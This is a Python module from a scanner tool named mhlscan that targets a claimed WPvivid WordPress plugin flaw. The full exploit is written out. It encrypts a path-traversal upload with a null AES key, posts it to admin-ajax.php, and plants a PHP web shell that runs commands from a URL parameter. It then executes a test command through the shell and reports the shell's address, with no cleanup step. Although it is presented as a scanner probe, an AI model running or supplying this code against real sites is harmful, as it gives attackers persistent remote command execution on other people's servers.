# GNU GPL License V3
# mhlscan by sigit-hdteamlabs

# -*- coding: utf-8 -*-
"""CVE-2026-1357 - WordPress WPvivid Unauthenticated RCE via AES-bypass."""

import base64
import requests
import urllib3
from datetime import datetime

from ._base import cve_module

urllib3.disable_warnings()


@cve_module(
    cve_id="CVE-2026-1357",
    name="WordPress WPvivid Unauthenticated RCE",
    severity="critical",
    requires=["wordpress", "wpvivid-backuprestore"],
    timeout=30,
    description="Null AES key bypass → upload PHP shell",
    aggressive=False,
)
def test(url, timeout=30, oast_url=None, **kwargs):
    base = url.rstrip("/")

    try:
        r = requests.head(f"{base}/wp-content/plugins/wpvivid-backuprestore/",
                          timeout=timeout, verify=False, allow_redirects=False)
        if r.status_code not in (200, 301, 403):
            return {"status": "not_vulnerable",
                    "details": "Plugin wpvivid tidak terdeteksi"}
    except Exception:
        return {"status": "not_vulnerable", "details": "connection failed"}

    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
    except ImportError:
        return {"status": "error",
                "details": "pycryptodome not installed (pip install pycryptodome)"}

    shell = '<?php system($_GET[0]);?>'
    shell_name = "mhlscan_probe.php"
    null_key = b"\x00" * 16

    try:
        data = f"../../../../wp-content/uploads/{shell_name}".encode() + b"\x00" + shell.encode()
        padded = pad(data, 16)
        cipher = AES.new(null_key, AES.MODE_ECB)
        encrypted = cipher.encrypt(padded)
        msg = "00" + format(len(encrypted), "016x") + encrypted.hex()
        encoded = base64.b64encode(msg.encode()).decode()
    except Exception as e:
        return {"status": "error", "details": "encrypt: " + str(e)}

    payload = {
        "action": "wpvivid_action",
        "wpvivid_action": "send_to_site",
        "wpvivid_content": encoded,
    }

    try:
        r = requests.post(f"{base}/wp-admin/admin-ajax.php",
                          data=payload, timeout=timeout, verify=False)
        if r.status_code != 200:
            return {"status": "not_vulnerable",
                    "details": f"HTTP {r.status_code}"}

        now = datetime.now()
        paths = [
            f"/wp-content/uploads/{shell_name}",
            f"/wp-content/uploads/{now.year}/{shell_name}",
            f"/wp-content/uploads/{now.year}/{now.month:02d}/{shell_name}",
            f"/wp-content/uploads/{now.year - 1}/{shell_name}",
            f"/wp-content/uploads/{now.year - 1}/12/{shell_name}",
        ]

        for path in paths:
            shell_url = base + path
            try:
                check = requests.get(f"{shell_url}?0=echo+MHLSCAN_PROBE_OK",
                                     timeout=timeout, verify=False)
                if check.status_code == 200 and "MHLSCAN_PROBE_OK" in check.text:
                    return {
                        "status": "vulnerable",
                        "details": "WPvivid RCE verified",
                        "evidence": f"Shell: {shell_url}",
                        "endpoint": "/wp-admin/admin-ajax.php",
                        "payload_file": shell_url,
                        "uploaded_shell": shell_url,
                        "shell_param": "0",
                    }
            except Exception:
                pass

        return {"status": "potential",
                "details": "Upload sukses tapi shell tidak ditemukan di path umum",
                "evidence": "Encrypted payload sent, no shell accessible"}
    except Exception as e:
        return {"status": "error", "details": type(e).__name__ + ": " + str(e)}